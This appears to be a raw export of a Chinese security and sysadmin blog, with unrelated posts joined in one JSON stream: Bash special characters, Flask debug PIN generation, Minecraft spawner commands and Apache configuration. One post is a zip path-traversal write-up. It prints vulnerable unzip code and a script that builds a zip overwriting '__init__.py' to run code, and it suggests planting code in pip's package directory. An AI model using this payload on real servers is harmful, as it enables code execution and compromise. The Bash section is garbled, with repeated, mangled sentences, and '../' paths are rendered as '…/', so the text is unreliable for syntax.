位置参数，这个在使用脚本文件的时候，在传递参数的时候会用到。两者都能返回调用脚本文件的所有参数，但∗是将所有参数作为一个整体返回（字符串），而*是将所有参数作为一个整体返回（字符串），而∗是将所有参数作为一个整体返回（字符串），而@是将每个参数作为单元返回一个参数列表。注意，在使用的时候需要用双引号将∗,*,∗,@括住。这两个变量收$IFS的影响，如果在实作，要考虑其中的一些细节，更多请自行查阅参考位置参数(Positional Parameters)的相关信息。 $? 此变量值在使用的时候，返回的是最后一个命令、函数、或脚本的退出状态码值，如果没有错误则是0，如果为非0，则表示在此之前的最后一次执行有错误。 $$ 进程ID变量，这个变量保存了运行当前脚本的进程ID值。 () 圆括号(parentheses)。 1， 命令组（Command group）。由一组圆括号括起来的命令是命令组，命令组中的命令实在子shell（subshell）中执行。因为是在子shell内运行，因此在括号外面是没有办法获取括号内变量的值，但反过来，命令组内是可以获取到外面的值，这点有点像局部变量和全局变量的关系，在实作中，如果碰到要cd到子目录操作，并在操作完成后要返回到当前目录的时候，可以考虑使用subshell来处理； 2. 用于数组的初始化。 {xx,yy,zz,…} 花括号扩展(Brace Expansion)。 在命令中可以用这种扩展来扩展参数列表，命令将会依照列表中的括号分隔开的模式进行匹配扩展。注意的一点是，这花括号扩展中不能有空格存在，如果确实有必要空格，则必须被转义或者使用引号来引用。例子: codeecho &#123;a,b,c&#125;-&#123;\\ d,``&quot; e&quot;``,``' f'``&#125; {a…z} 在Bash version 3时添加了这种花括号扩展的扩展，可以使用{A…Z}表示A-Z的所有字符列表，这种方式的扩展Mitchell测试了一下，好像仅适用于A-Z，a-z，还有数字{minNo…maxNo}的这种方式扩展。 {} 代码块(curly brackets)。这个是匿名函数，但是又与函数不同，在代码块里面的变量在代码块后面仍能访问。注意：花括号内侧需要有空格与语句分隔。另外，在xargs -i中的话，还可以作为文本的占位符，用以标记输出文本的位置。 {} ; 这个{}是表示路径名，这个并不是shell内建的，现在接触到的情况看，好像只用在find命令里。注意后面的分号，这个是结束find命令中-exec选项的命令序列，在实际使用的时候，要转义一下以免被shell理解错误。 [] 中括号（brackets）。 1. 测试的表示，Shell会测试在[]内的表达式，需要注意的是，[]是Shell内建的测试的一部分，而非使用外部命令/usr/bin/test的链接； 2. 在数组的上下文中，表示数组元素，方括号内填上数组元素的位置就能获得对应位置的内容，如： codeArray[1]=xxx``echo $&#123;Array[1]&#125;; 3. 表示字符集的范围，在正表达式中，方括号表示该位置可以匹配的字符集范围。 [[]] 双中括号(double brackets)。这个结构也是测试，测试[[]]之中的表达式(Shell的关键字)。这个比单中括号更能防止脚本里面的逻辑错误，比如：&amp;&amp;,||,&lt;,&gt;操作符能在一个[[]]里面测试通过，但是在[]却不能通过。[[]]里面没有文件名扩展(filename expansion）或是词分隔符(Word splitting)，但是可以用参数扩展(Parameter expansion)和命令替换(command substitution)。不用文件名通配符和像空白这样的分隔符。注意，这里面如果出现了八进制，十六进制等，shell会自动执行转换比较。 $[…] 词表达表示整数扩展(integer expansion)，在方括号里面执行整数表达式。例： codea=3``b=7``echo $[$a+$b]``echo $[$a*$b]``##返回是10和21 (()) 双括号(double parentheses)。 表示整数扩展（integer expansion）。功能和上面的[]差不多，但是需要注意的是，[]差不多，但是需要注意的是，[]差不多，但是需要注意的是，[]是会返回里面表达式的值的，而(())只是执行，并不会返回值。两者执行后如果变量值发生变化，都会影响到后继代码的运行。可对变量赋值，可以对变量进行一目操作符操作，也可以是二目，三目操作符。 &gt;,&amp;&lt;,&gt;&amp;,&gt;&gt;,&lt;,&lt;&gt; 重定向(redirection)。 codescriptname &gt;filename 重定向scriptname的输出到文件filename中去，如果文件存在则覆盖； codecommand &amp;&gt;filename ，会重定向command的标准输出(stdout)和标准错误(stderr)到文件filename中； codecommand &gt;&amp;2 把command的标准输出(stdout)重定向到标准错误(stderr)中； codescriptname &gt;&gt;filename ，吧scriptname的输出（同&gt;)追加到文件filenmae中，如果文件不存在则创建。 code[i]&lt;&gt;filename 打开filename这个文件用来读或者写，并且给文件指定i为它的文件描述符(file descriptor)，文件不存在就会创建。 (command)&gt;,&lt;(command) 这是进程替换(Process Substitution)。使用的时候注意，括号和&lt;,&gt;之间是不能有空格的，否则报错。其作用有点类似通道，但和管道在用法上又有些不同，管道是作为子进程的方式来运行的，这个命令会在/dev/fd/下面产生类似/dev/fd/63,/dev/fd/62这类临时文件，用来传递数据。Mitchell个人猜测之所以用这种方法来传递，是因为前后两个不属于同一个进程，因此需要用共享文件的方式来传递资料(这么说其实管道也应该有同样的文件?)。网上有人说这个只是共享文件而已，但是经过测试，发现虽然有/dev/fd/63这样的文件产生，但是这个文件其实是指向pipe:[43434]这样的通道的链接。 &lt;&lt; 双小于号(here-document[double less then marks])。这个也被称为Here-document，用来将后继的内容重定向到左侧命令的stdin中。&lt;&lt;可以节省格式化时间，别且使命令执行的处理更容易。在实作的时候只需要输入&lt;&lt;和终止标志符，而后（一般是回车后）你就可以输入任何内容，只要在最后的新行中输入终止标志符，即可完成数据的导入。使用here-document的时候，你可以保留空格，换行等。如果要让shell脚本更整洁一点，可以在&lt;&lt;和终止符之间放上一个连字符(-)。 &lt;&lt;&lt; 三个小于号(here-strings)。Here-字串和Here-document类似，here-strings语法：command [args] &lt;&lt;&lt;[&quot;]$word[&quot;]；$word会展开并作为command的stdin。 &lt;,&gt; 小于，大于号(ASCII Comparison)。ASCII比较，进行的是变量的ASCII比较，字串？数字?呃…这个…不就是ASCII比较么？ &lt;…&gt; 词界符(word boundary)。这个是用在正则表达式中的一个特殊分隔符，用来标记单词的分界。比如：the会匹配there，another，them等等，如果仅仅要匹配the，就可以使用这个词界符，&lt;the&gt;就只能匹配the了。 | 管道(pipe)。管道是Linux，Unix都有的概念，是非常基础，也是非常重要的一个概念。它的作用是将管道前（左边）的命令产生的输出(stdout)作为管道后（右边）的命令的输入(stdin)。如：`ls &gt;| 强制重定向(force redirection)。这会强制重写已经存在的文件。 &amp; 与号(Run job in background[ampersand])。如果命令后面跟上一个&amp;符号，这个命令将会在后台运行。有的时候，脚本中在一条在后台运行的命令可能会引起脚本挂起，等待输入，出现这种情况可以在原有的脚本后面使用wait命令来修复。 &amp;&amp;,|| 逻辑操作符(logical operator)。在测试结构中，可以用这两个操作符来进行连接两个逻辑值。||是当测试条件有一个为真时返回0（真），全假为假；&amp;&amp;是当测试条件两个都为真时返回真(0)，有假为假。 - 减号，连字符(Hyphen/minus/dash)。 1. 作为选项，前缀[option, prefix]使用。用于命令或者过滤器的选项标志；操作符的前缀。如： code## COMMAND -[选项列表] ``ls -al``sort -dfu $``file``set -- $variable if [ $``file -ot $file2 ]``then`` ``echo &quot;$file is older than $file2.&quot;``fi 2. 用于stdin或者stdout的重定向的源或目的[dash].在tar没有bunzip2的程序补丁时，我们可以这样： code`bunzip2 linux-2.6.13.tar.bz2 = 等号(Equals)。 1. 赋值操作，给变量赋值，么有空格在等号两侧； 2. 在比较测试中作为比较符出现，这里要注意，如果在中括号中作为比较出现，需要有空格符在等号左右两侧。 + 加号(Plus)。 1. 算术操作符，表示加法； 2. 在正则表达式中，表示的是其前的这个匹配规则匹配最少一次; 3.在命令或过滤器中作为选项标记，在某些命令或者内置命令中使用+来启用某些选项，使用-来禁止； 4. 在参数替换(parameter substitution)中，+前缀表示替代值(当变量为空的时候，使用+后面的值) % 百分号(modulo[percent sign])。 1.在算术运算中，这个是求模操作符，即两个数进行除法运算后的余数； 2. 在参数替换(parameter substitution)中，可以作为模式匹配。例子： codep=b*9``var=``&quot;abcd12345abc479&quot;``echo $&#123;var%p&#125;, $&#123;var%%p&#125;``##从右边开始查找(想想从左是那个符号?)``##任何在b和9之间的内容（含）``##第一个是找到最短的符合匹配项``##后一个是找最大符合的匹配项（贪婪匹配?) ~ 波浪号(Home directory[tilde])，这个和内部变量$HOME是一样的。默认表示当前用户的家目录（主目录），这个和~/效果一致，如果波浪号后面跟用户名，表示是该用户的家目录， ~+ 当前的工作目录(current working directory)。这个和内置变量$PWD一样。 ~- 前一个工作目录(previous working directory)。这个和内部变量$OLDPWD一致，之前的[-]也一样。 =~ Bash 版本3中有介绍，这个是正则表达式匹配。可用在[[]]测试中，比如： `var=“this is a test message.” [[ “$var” =~ tf*message ]] &amp;&amp; echo “Sir. Found that.” ^ 脱字符(caret)。 1. 在正则表达式中，作为一行的行首(beginning-of-line)位置标志符； 2. 在参数替换(Parameter substitution)中，这个用法有两种，一个脱字符($&#123;var^&#125;)，或两个($&#123;var^^&#125;)，分别表示第一个字母大写，全部大写的意思(Bash version &gt;=4)。 空白 空白符(Whitespace)。空白符不仅仅是指空格(spaces)，还包括制表符(tabs)，空行(blank lines)，或者这几种的组合。可用做函数的分隔符,分隔命令或变量，空行不会影响脚本的行为，因此可以用它来规划脚本代码，以增加可读性，在内置的特殊变量$IFS可以用来针对某些命令进行输入的参数进行分割，其默认就是空白符。在字符串或变量中如果有空白符，可以使用引号来规避可能的错误。 怎样，你有多少是了解的呢？Mitchell在开始的Shell脚本时候，发现在这里面有好多都是不认识呢。 说明： 因为涉及到翻译，文中内容不一定完全翻译准确，如果你发现有错误的地方，还请包涵指正。 参考： 本文主要内容来源：Advanced Bash-Scripting Guide 对话 UNIX: !$#@*% wikipedia的Here文档"},{"title":"python文件解压unzip导致的代码执行","date":"2020-03-25","updated":"2024-03-19","path":"2020/03/25/python文件解压unzip导致的代码执行/","text":"一、前言 ​ Python中负责解压压缩文件的代码实现上并不安全，存在目录遍历漏洞，攻击者可以利用该漏洞覆盖**init.py**文件，实现任意代码执行。 ​ 在PHP中，实现代码执行最为简单的一种方式就是利用PHP中不安全的文件上传处理逻辑。如果你可以欺骗文件上传逻辑，上传任意PHP文件，那么你就可以执行任意PHP代码。然而，如果我们面对的是使用Go、Node.js、Python、Ruby等编写的现代Web框架时，情况会有所变化。这种情况下，即使我们把.py或者.js文件成功上传到服务器上，通过URL请求这些文件通常并不会返回任何结果，因为目标应用程序并没有开放相应的路由或者URL渠道。即使我们可以通过URL来访问这些资源，也不会触发任何代码执行动作，因为服务器会把这些文件当作静态文件，以文本形式返回这些文件的源代码。在本文中，我们会介绍如何在Python构造的Web环境中实现代码执行，前提是我们可以将压缩文件上传到服务器。 ​ 简而言之，Web应用中的安全规则就是永远不要信任用户的输入，这个原则不仅仅局限于原始的HTTP请求对象范围（如查询参数、具体post的内容、文件、头部信息等）。精心构造的压缩文件虽然看起来人畜无害，但如果负责解压此类文件的代码本身并不安全，那么这种文件就会带来安全风险。本文介绍了这类漏洞的细节及利用方法，具体灵感源自于MobSF上的一份安全漏洞报告。首先，让我们先来研究一下不安全的代码。 1234567891011121314151617181920212223242526def unzip(zip_file, extraction_path): &quot;&quot;&quot; code to unzip files &quot;&quot;&quot; print &quot;[INFO] Unzipping&quot; try: files = [] with zipfile.ZipFile(zip_file, &quot;r&quot;) as z: for fileinfo in z.infolist(): filename = fileinfo.filename dat = z.open(filename, &quot;r&quot;) files.append(filename) outfile = os.path.join(extraction_path, filename) if not os.path.exists(os.path.dirname(outfile)): try: os.makedirs(os.path.dirname(outfile)) except OSError as exc: # Guard against race condition if exc.errno != errno.EEXIST: print &quot;n[WARN] OS Error: Race Condition&quot; if not outfile.endswith(&quot;/&quot;): with io.open(outfile, mode=&#x27;wb&#x27;) as f: f.write(dat.read()) dat.close() return files except Exception as e: print &quot;[ERROR] Unzipping Error&quot; + str(e) ​ 这段python代码非常简单，可以解压zip文件并返回归档文件中包含的文件列表。文件上传操作结束后，服务器会收到zip文件，然后将zip文件发送给unzip()进行解压。如果你观察这行代码： 1outfile = os.path.join(extraction_path, filename) ​ 你会发现用户可以控制其中的filename变量。如果我们将filename的值设为“…/…/foo.py”，代码运行结果如下所示： 123456789&gt;&gt;&gt; import os&gt;&gt;&gt; extraction_path = &quot;/home/ajin/webapp/uploads/&quot;&gt;&gt;&gt; filename = &quot;../../foo.py&quot;&gt;&gt;&gt; outfile = os.path.join(extraction_path, filename)&gt;&gt;&gt; outfile&#x27;/home/ajin/webapp/uploads/../../foo.py&#x27;&gt;&gt;&gt; open(outfile, &quot;w&quot;).write(&quot;print &#x27;test&#x27;&quot;)&gt;&gt;&gt; open(&quot;/home/ajin/foo.py&quot;, &quot;r&quot;).read()&quot;print &#x27;test&#x27;&quot; ​ 利用这个路径遍历漏洞，我们可以将文件写入任意位置。在这种情况下，我们成功将文件写入“/home/ajin”目录，并没有写在当前的“/home/ajin/webapp/uploads/”目录中。 二、任意代码执行 ​ 我们已经可以将python代码写到任意目录中。现在，我们来研究一下如何执行这段代码。我们可以使用存在漏洞的这个应用作为实验对象，该应用使用Python Flask开发。具体的原理是利用Python中的“init.py”实现代码执行。Python的官方文档中有这样一段话： ​ “如果某个目录想成为Python中的包，那么该目录中就需要包含__init__.py文件，这样就能避免模块搜索时把目录名为常用字符串（如string）的那些目录包含进来。在最简单的情况下，init.py可以是个空文件，也可以用来执行包中的初始化代码或者设置__all__变量，稍后会继续描述。” ​ 根据这段表述，假设Web应用将某个目录当成Python包，如果我们使用任意Python代码覆盖该目录中的__init__.py文件，当目标应用导入这个包时，就会执行我们的代码。通常i情况下，为了顺利执行代码，我们需要重启服务器。在本文案例中，我们的实验目标为一个Flask服务器，并且启用了debug功能（debug设为True），这意味着只要Python文件发生改动，服务器就会重启。 三、构造Payload ​ 存在漏洞的这个Web应用有个名为config的目录，该目录中包含__init__.py以及settings.py文件。主功能文件server.py会从config目录中导入settings.py文件，这意味着如果我们可以将代码写入到config/init.py，我们就可以实现代码执行。我们可以使用如下代码构造攻击载荷： 123456import zipfilez_info = zipfile.ZipInfo(r&quot;../config/__init__.py&quot;)z_file = zipfile.ZipFile(&quot;/home/ajin/Desktop/bad.zip&quot;, mode=&quot;w&quot;)z_file.writestr(z_info, &quot;print &#x27;test&#x27;&quot;)z_info.external_attr = 0777 &lt;&lt; 16Lz_file.close() ​ 查看负责文件上传的代码时， 你会看到上传的文件被解压到uploads目录中。我们可以利用zipfile.ZipInfo()语句构造恶意文件名。这里我们需要将文件名设为“…/config/init.py”，以覆盖config目录中的__init__.py文件。z_info.external_attr = 0777 &lt;&lt; 16L这条语句会将文件权限设为所有人可读可写权限。现在，我们来创建一个zip文件，将其上传到目标应用中。 ​ 我们可以看到Flask应用开始重载，然后服务器上的控制台会打印出“test”字符串。看来我们已经实现代码执行目的。 四、攻击实际环境中的应用 ​ 前面这个案例中，由于Flask服务器运行在debug模式下，因此会立即执行任意代码。实际环境中情况可能不会完全一致。你可能需要等待一段时间，直至服务器重启为止。另一个问题是，我们并不能每次都知道目标应用使用的包的具体路径（本例中为config目录）。如果目标使用的是开源项目，通过阅读源代码我们很容易就能得到这些信息。对于闭源应用来说，我们可以猜测比较常见的包目录，如conf、config、settings、utils、urls、view、tests、scripts、controllers、modules、models、admin、login等。这些包目录经常出现在某些Python Web框架中，如Django、Flask、Pyramid、Tornado、CherryPy、web2py等。 ​ 换个思路，假设目标Web应用运行在Ubuntu Linux系统之上，这种情况下，已安装的、内置的Python包位于/home//.local/lib/python2.7/site-packages/pip目录中。假设目标应用运行在用户目录中，那么我们就可以构造类似“…/…/.local/lib/python2.7/site-packages/pip/init.py”之类的文件名。文件完成解压后，利用这个文件名就可以在pip目录中生成__init__.py文件。如果目标应用使用的是virtualenv，假设virtualenv的目录为venv，那么我们就可以使用类似“…/venv/lib/python2.7/site-packages/pip/init.py”之类的文件名。这样处理后pip会受到影响，但下次服务器上的用户运行pip命令时，就会执行我们的代码。 五、预防措施 ​ 为了防御这个漏洞，你需要使用ZipFile.extract()来解压文件。zipfile文档中有这样一段话： ​ “如果待处理文件使用的是绝对路径，那么路径中包含的驱动、UNC字符以及前缀（后缀）斜杠会被过滤掉，例如，在Unix上，///foo/bar经过处理后会变为foo/bar，在Windows上，C:foobar经过处理后会变为foobar。文件名中包含的所有“…”字符会被移除，例如，…/…/foo…/…/ba…r会变成foo…/ba…r。在Windows上的非法字符（:、&lt;、&gt;、|、&quot;、?、以及*）会被替换为下划线（_）”。 https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/358 https://www.anquanke.com/post/id/86961"},{"title":"Flask-Debug-pin码生成机制","date":"2020-03-24","updated":"2024-03-19","path":"2020/03/24/Flask-Debug-pin码生成机制/","text":"原文地址 http://www.91ri.org/17362.html 0x01 基础环境 Windows 7 x64 Python 2.7.14 Flask 0.12.2 pdb 0x02 PIN 码生成流程分析 在分析Flask程序执行流程，直到定位到PIN码生成函数这段过程，都会大量依赖pdb，来梳理函数间的调用关系。 示例代码依旧使用上一篇文章中的测试代码： 123456789101112# -*- coding: utf-8 -*-import pdbfrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;)def hello(): return Helloif __name__ == &quot;__main__&quot;: pdb.set_trace() app.run(host=&quot;127.0.0.1&quot;, port=80, debug=True) 值得注意的是，我在第1行import pdb，第11行pdb.set_trace()，就是在app.run()函数前下断点。关于pdb的常用命令，不需要再去其他博文中补充知识。用到哪个，我都会简单介绍下。 第1步：启动该Flask应用（其会在app.run()函数前断掉） 第2步：使用s命令，进入app.run()函数中（C:\\Python27\\Lib\\site-packages\\flask[app.py](http://link.zhihu.com/?target=http%3A//app.py/)第782-846行），多次输入n命令（执行下一行），抵达第841行的run_simple()函数 按s命令，进入run_simple()函数。多次执行n命令，抵达C:\\Python27\\Lib\\site-packages\\werkzeug[serving.py](http://link.zhihu.com/?target=http%3A//serving.py/) 第736行，创建DebuggedApplication对象的位置（即创建对象的过程会执行DebuggedApplication类的__init__构造方法）。 按s命令，步入DebuggedApplication类的实现代码（C:\\Python27\\Lib\\site-packages\\werkzeug\\debug_init_.py 第199-468行）中： 根据文件名称、类名称等可以推断出，这部分中就会有生成PIN码的关键代码。 顺便提一句， Flask is a microframework for Python based on Werkzeug, Jinja 2 and good intentions. Flask是基于Werkzeug和Jinja 2的Web框架。研究Flask的PIN码生成机制，就是研究Werkzeug的PIN码生成机制。 继续向下跟，第251行和第262行之间 有一个判断操作，如果PIN启用的话，及self.pin存在值，则会通过_log()函数，将PIN码打印到终端。 ok，那我们现在只要在程序执行到if self.pin is None:时。进入self.pin，查看其实现方式即可（这里用到了Property的概念，简单理解在Python的类中，针对类中的成员变量，提供了Property，方便定义get和set方法，方便对该变量取值和赋值。详细内容可以在参考链接中查看）。 第266行，通过get_pin_and_cookie_name()函数对PIN码进行赋值 继续跟进get_pin_and_cookie_name()函数（第115-196行），重头戏来了！ 在这个函数中，前几行定义了pin、rv、num 3个变量值为None（在调试器中使用【pp 变量名】即可查看变量值）。其中根据函数的返回值，rv的值就是我们要重点关注的PIN码，在这个函数的执行流程中，需要重点关注rv变量的赋值。 由于PIN的值为None，so第108-137行两个if判断均不会执行，继续向下走。 modname变量被赋值为“flask.app” 继续向下执行，在第145行username = getpass.getuser()，username变量被赋值为“当前登录服务器的用户名”。向下执行，mod被赋值为&lt;module ‘flask.app‘ from ‘C:\\Python27\\lib\\site-packages\\flask\\app.pyc’&gt;。 继续向下执行，第151-168行，是生成PIN码的储备阶段，对多个变量进行了赋值。 下图为各变量此时的值 通过h.hexdigest()函数可以获得h的MD5值（后面会用到）。 根据上图的执行流程，先来看下169-174行的for循环，循环次数即为前面那一坨变量值得数量，共6次。 第1次循环，将“当前机器用户名”的MD5形式存入h变量中。 第2次循环，将“当前机器用户名”+flask.app的MD5形式存入h变量中。 … 第6次循环，将以上6个值的MD5形式存入h变量中 第175、182行将两个固定的字符串加入其中。变量num的值为MD5值16进制的前9位，经过187-194行代码处理，以111-222-333形式输出。 0x03 PIN 码的生成流程安全么？ 通过0x02小结，现在已经摸清了PIN码的生成流程。我们可以知道PIN码的值由 当前计算机用户名：XXX、 [flask.app]、 Flask、 C:\\\\Python27\\\\lib\\\\site-packages\\\\flask\\\\app.pyc、 str(uuid.getnode())、 get_machine_id()组合获得，缺一不可。 【flask.app】、【Flask】已知。 绝对路径可以由debug页面的报错信息获得，【C:\\Python27\\lib\\site-packages\\flask\\app.pyc】也能拿到。 现在的问题是，如何获得【当前计算机用户名：XXX】、【str(uuid.getnode())】、【get_machine_id()】3个变量的值。 先来看下Flask自动义的get_machine_id()函数（C:\\Python27\\Lib\\site-packages\\werkzeug\\debug_init_.py 第51-101行） 返回值rv由内部的_generate()函数获得。 根据第60-65行，可以看到， 若/etc/machine-id，/proc/sys/kernel/random/boot_id文件存在，则返回文件中的值。看到这里就知道，想要预测这个值，那是没戏了。 因为我的测试机用的Windows，看一下对Windows这块是怎么实现的。 欢笑中打出GG。至于获取【当前计算机用户名：XXX】、【str(uuid.getnode())】的实现代码，我这里就不做过多的分析了。 0x04 后记 通过这次分析，可以学习到Flask的开发人员在实现PIN生成机制的过程中还是非常严谨的。至少我这里没有办法预测出指定机器的PIN码。 文章记录了我这次分析的过程，虽然没有找到预测PIN码的方法，但是学习到了Flask的PIN码生成机制，以及通过pdb调试代码。也算是一种收获吧。 当然，如果对这方面有兴趣的同学，恰好看到了我的这篇文章，希望你也能有所收获。同时，如有谬误，还请不吝赐教。 之后的话，我可能还会看下有没有绕过PIN码直接调用Python shell的方式、或者其他的安全问题。 随着Python的广泛应用，在机器学习、Web开发方面可以越来越多的看到Python的身影，Python相关的安全问题也越来越重要。我这里抛砖引玉，记录一下我的学习过程，期待各位大佬投入到相关安全问题的挖掘中来（可能很多人已经在做了），同时可以分享自己的研究成果。期待ing 0x05 参考链接 Python 代码调试技巧 Flask (A Python Microframework) Python中的property() 函数 和@property 装饰符 Linux 内核参数详解-KERNEL"},{"title":"我的世界刷怪笼","date":"2020-03-24","updated":"2024-03-19","path":"2020/03/24/我的世界刷怪笼/","text":"通用指令：/setblock ~ ~1 ~ minecraft:mob_spawner 0 replace {EntityId:Spider}这是一个刷蜘蛛的笼子，把EntityId后面的名字改成以下名字： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970711，攻击型生物50 32 爬行者 Creeper51 33 骷髅凋灵骷髅 Skeleton52 34 蜘蛛 Spider53 35 巨人 Giant54 36 僵尸 Zombie55 37 史莱姆 Slime56 38 恶魂 Ghast57 39 僵尸猪人 PigZombie58 3A 末影人 Enderman59 3B 洞穴蜘蛛 CaveSpider60 3C 蠹虫 Silverfish61 3D 烈焰人 Blaze62 3E 岩浆怪 LavaSlime63 3F 末影龙 EnderDragon64 40 凋灵 WitherBoss66 42 女巫 Witch67 43 末影螨 Endermite68 44 守卫者 Guardian2，被动型生物65 41 蝙蝠 Bat90 5A 猪 Pig91 5B 羊 Sheep92 5C 牛 Cow93 5D 鸡 Chicken94 5E 鱿鱼 Squid95 5F 狼 Wolf96 60 哞菇 MushroomCow97 61 雪傀儡 SnowMan98 62 豹猫 Ozelot99 63 铁傀儡 VillagerGolem100 64 马 EntityHorse101 65 兔子 Rabbit3，NPC120 78 村民 Villager"},{"title":"反序列化-PHP原生类的利用","date":"2020-03-23","updated":"2024-03-19","path":"2020/03/23/反序列化-PHP原生类的利用/","text":"https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html"},{"title":"Hacklu-2017","date":"2020-03-23","updated":"2024-03-19","path":"2020/03/23/Hacklu-2017/","text":"Triangle"},{"title":"mysql-h参数自动连接现象","date":"2020-03-23","updated":"2024-03-19","path":"2020/03/23/mysql-h参数自动连接现象/","text":"在aliyun服务器上查看着mysql日志，然后在linux 终端终结者shell zsh里面输入mysql -h 阿里云ip,此时阿里云的mysql日志上已经显示有ip连接了三次，后来发现 只要是先输入-h参数，后面每输入一个字符都会进行一次无密码连接 但是在bash下就不会"},{"title":"Hexo部署在apache","date":"2020-03-23","updated":"2024-03-19","path":"2020/03/23/Hexo部署在apache/","text":"修改_config.yml url字段 还有 root字段"},{"title":"apache配置文件","date":"2020-03-23","updated":"2024-03-19","path":"2020/03/23/apache配置文件/","text":"正文 Apache 的配置文件为 httpd.conf，在 /Apache24/conf/ 下。乍一看它的配置文件很大，有 500 多行，但其实大部分都是注释，是对配置项的解释和说明。 下面是从上到下对各个配置项的说明： ServerRoot ServerRoot 主要用于指定 Apache 的安装路径，此选项参数值在安装 Apache 时系统会自动写入。 Windows 下安装时，值为 Apache 安装的路径，Linux 下安装时，值为编译时 --prefix 的路径。 ServerRoot “D:/web/Apache/Apache24” Mutex default:logs 为多个不同的互斥对象设置互斥机制（mutex mechanism）和互斥文件目录，或者修改全局默认值。如果互斥对象是基于文件的并互斥文件目录不在本地磁盘，那么取消注释并改变目录。 # Mutex default:logs Listen 设置 Apache 监听的 Web 服务端口号，默认为：80，即监听所有的地址的 80 端口。也可以写成 IP 地址 + 端口号的形式，用来监听特定 IP。 #Listen 12.34.56.78:80 Listen 80 Dynamic Shared Object (DSO) Support（动态共享对象支持） 主要用于添加 Apache 一些动态模块，例如重定向模块，认证模块等。如果需要添加某些模块，只需把相关模块前面注释符号取消掉即可。 … #LoadModule ssl_module modules/mod_ssl.so #LoadModule status_module modules/mod_status.so #LoadModule substitute_module modules/mod_substitute.so #LoadModule unique_id_module modules/mod_unique_id.so #LoadModule userdir_module modules/mod_userdir.so #LoadModule usertrack_module modules/mod_usertrack.so #LoadModule version_module modules/mod_version.so #LoadModule vhost_alias_module modules/mod_vhost_alias.so #LoadModule watchdog_module modules/mod_watchdog.so #LoadModule xml2enc_module modules/mod_xml2enc.so LoadMoudle 后面第一个参数为模块的名称，第二个参数为模块的路径。 Apache运行用户和用户组 此选项主要用指定 Apache 服务的运行用户和用户组，默认为：daemon。 User daemon Group daemon &lt;/IfModule&gt; 这里顺便介绍下 &lt;IfModule&gt; 的含义： &lt;IfModule test&gt; … &lt;/IfModule&gt; 配置段用于封装根据指定的模块是否启用而决定是否生效的指令。也就是说，如果启用了 test 模块，那么这些配置生效，如果没有启用，则不生效。 ServerAdmin 此选项主要用指定 Apache 服务管理员通知邮箱地址，选择默认值即可。 ServerAdmin admin@example.com ServerName 此选项主要用指定本服务器名称和端口号，可以设定为 IP 地址或者域名，当这项不正确的时候服务器不能正常启动。 ServerName localhost:80 Directory 根目录访问控制设置 此选项设置拒绝用户访问根目录文件，后面有另外一个 Directory 选项可以设置自己网站的访问权限。 &lt;Directory /&gt; AllowOverride none Require all denied &lt;/Directory&gt; DocumentRoot 站点的根目录。 DocumentRoot “D:/web/www” Directory 站点目录的访问控制设置 对站点根目录的权限访问设置，默认对网站的根目录具有访问权限。 对 D:/web/ww目录的访问权限的设置。 Options： Indexes 表示当网页不存在的时候允许索引显示目录中的文件；FollowSymLinks 表示允许访问符号链接文件；ExecCGI 表示允许使用CGI； SymLinksOwnerMatch 表示当符号链接的文件和目标文件为同一用户拥有时才允许访问； AllowOverride： None 表示不允许这个目录下的访问控制文件（.htaccess）来改变这里的配置，也就是不用查看这个目录下的访问控制文件，修改为 AllowOverride All 表示允许 .htaccess 更改配置； Require：对页面的访问控制，和上一项结合可以控制对网站的访问控制； &lt;Directory “D:/web/www”&gt; Options Indexes FollowSymLinks // 可以访问站点目录 # Options None // 不允许访问站点目录，只能打开文件 AllowOverride None Require all granted &lt;/Directory&gt; DirectoryIndex 设置 Apache 默认支持的首页，默认只支持: index.html，如要支持其他类型的首页，需要在此区域添加：如 index.php 表示支持 index.php 类型首页。 DirectoryIndex index.html index.php &lt;/IfModule&gt; 禁止访问.ht文件 此选项主要是针对 .ht 文件访问控制，默认为禁止访问。 1&lt;Files &quot;.ht*&quot;&gt; Require all denied &lt;/Files&gt; ErrorLog 设置错误日志的存放位置。 ErrorLog “logs/error.log” LogLevel 设置哪种等级的错误需要写入错误日志，可选参数: debug, info, notice, warn, error, crit, alert, emerg. LogLevel warn log_config_module模块设置 日志相关设置，包括记录日志的格式与 access 日志存放的位置等。 #用不同的代号表示参数，并定义了日志的格式 LogFormat “%h %l %u %t &quot;%r&quot; %&gt;s %b &quot;%{Referer}i&quot; &quot;%{User-Agent}i&quot;” combined LogFormat “%h %l %u %t &quot;%r&quot; %&gt;s %b” common # You need to enable mod_logio.c to use %I and %O LogFormat “%h %l %u %t &quot;%r&quot; %&gt;s %b &quot;%{Referer}i&quot; &quot;%{User-Agent}i&quot; %I %O” combinedio &lt;/IfModule&gt; # access log 的位置和格式 CustomLog “logs/access.log” common #CustomLog “logs/access.log” combined &lt;/IfModule&gt; Redirect Alias ScriptAlias 这个模块包括 URL 重定向、别名、脚本别名相关配置。 Redirect 参数是用来重定向的，当浏览器访问服务器上的一个已经不存在的资源的时候，服务器返回给浏览器新的 URL，告诉浏览器从该 URL 中获取资源。这主要用于原来存在于服务器上的文档改变位置之后，又需要能够使用老 URL 能访问到原网页； Alias 用于给某个路径赋值别名，可以定义一些不在 DocumentRoot 下的文件，并将其映射到网页根目录中，这也是访问其他目录的一种方法，但在声明时要在目录后面加 / ScriptAlias 与 Alias 相似，对脚本解释器赋值别名； # Redirect permanent /foo http://www.example.com/bar # Alias /webpath /full/filesystem/path ScriptAlias /cgi-bin/ “c:/Apache24/cgi-bin/” cgi设置 #Scriptsock cgisock &lt;/IfModule&gt; # cgi 目录访问限制 &lt;Directory “c:/Apache24/cgi-bin”&gt; AllowOverride None Options None Require all granted &lt;/Directory&gt; # 可以实现一些 HTTP header 的设置，如缓存时间等 RequestHeader unset Proxy early &lt;/IfModule&gt; MIME媒体文件支持 主要包含一些 MIME 文件支持，表示文件扩展名与文件内容类型之间的映射关系，例如添加对 PHP 文件扩展名映射关系。 # 指定使用该文件的映射关系 TypesConfig conf/mime.types # AddType:新增或者重写映射规则 #AddType application/x-gzip .tgz # AddEncoding:用于告诉浏览器一些使用压缩的 MIME 类型，这样可以让浏览器进行解压缩操作，但不是所有的浏览器都支持 #AddEncoding x-compress .Z #AddEncoding x-gzip .gz .tgz # 如果不支持，则需要用AddType AddType application/x-compress .Z AddType application/x-gzip .gz .tgz # AddHandler:表示允许某些后缀名的文件采用某种格式脚本运行 